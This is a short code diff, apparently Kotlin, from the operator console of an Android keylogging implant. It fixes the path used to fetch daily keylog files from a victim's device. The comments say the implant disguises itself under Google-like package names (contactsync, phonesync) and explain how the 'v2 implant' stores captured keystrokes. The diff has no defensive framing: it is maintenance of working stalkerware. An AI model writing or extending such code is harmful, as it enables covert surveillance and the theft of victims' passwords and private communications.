@@ -33,7 +33,17 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 
-private const val KEYLOG_DIR = "/data/data/com.google.android.contactsync/files/keylogs"
+// The implant's own keylog dir. It is <implant package>/files/keylogs, and the
+// implant package is NOT stable across branches: main ships
+// com.google.android.contactsync while deepseek/version2 ships
+// com.google.android.phonesync. The DEVICE runs the v2 implant, so this must
+// match phonesync -- hardcoding the main-branch name is exactly what made every
+// read 404 with "no such file on target" while the listing (which parses only
+// the bare filename, no path) kept working.
+//
+// keylog_list returns BARE FILENAMES (cmd_fs_list emits "type\tsize\tname"), so
+// the operator has to rebuild the absolute path itself -- hence this constant.
+private const val KEYLOG_DIR = "/data/data/com.google.android.phonesync/files/keylogs"
 private val KEYLOG_NAME = Regex("""keylog_(\d{4}-\d{2}-\d{2})\.txt""")
 
 private data class KeyDay(val date: String, val name: String, val size: Long) {
